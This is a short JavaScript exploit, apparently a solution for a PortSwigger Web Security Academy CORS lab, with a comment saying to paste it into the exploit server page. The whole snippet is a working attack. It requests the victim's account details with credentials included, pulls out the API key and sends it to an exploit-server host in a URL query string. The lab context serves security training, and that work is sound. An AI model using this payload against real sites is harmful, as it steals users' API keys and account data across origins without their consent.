// Malicious code below. Copy/paste into the "Body" section of the exploit server page, enclosed in <script> tags


const lab_serv = '0a7f0065040c089a81cba70600c400f1' //Change burp exercise lab id accordingly
const exploit_serv =  '0a9300a3047008a681b8a6c7016a0051' //Change burp execrcise exploit id accordingly

function reqListener() {
    fetch('https://' + lab_serv + '.web-security-academy.net/accountDetails', {"credentials": "include",}).then( async (response) => {
        let data = await response.json(); 
        fetch('https://exploit-' + exploit_serv + '.exploit-server.net/log?key=' + data.apikey);
    });
}

reqListener()